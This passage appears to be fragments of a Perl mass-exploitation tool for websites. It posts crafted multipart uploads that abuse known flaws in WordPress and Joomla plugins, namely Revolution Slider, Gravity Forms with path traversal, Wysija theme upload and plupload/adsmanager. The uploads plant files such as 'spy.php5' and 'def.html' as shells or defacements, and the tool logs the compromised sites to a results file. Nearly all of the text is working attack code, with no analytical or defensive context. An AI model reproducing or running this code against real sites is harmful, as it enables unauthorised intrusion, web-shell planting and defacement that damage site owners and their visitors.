...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["files/v5rev.zip"]]);
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["files/v5def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "spy.php5"]);
...
my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["files/v5def.jpg"], form_id => '1', name => 'spy.html', gform_unique_id => '../../../../../', field_id => '3',]);
...
my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['files/v5wysija.zip', => 'files/v5wysija.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["files/v5def.jpg"], name => "def.html"]);
if ($exploit->decoded_content =~ /def.html/) {
        open(save, '>>Result/index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/Result/plupload/def.html";
...
$filee="files/v5jdhtml.rar";
$filezz="files/v5jd.html.j";
...
my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["files/v5def.jpg"], name => "def.html"]
           
            );

$comadsmanagerup="$site/Result/plupload/def.html";
...
$hwdvideoshares="$site/Result/v5.php";
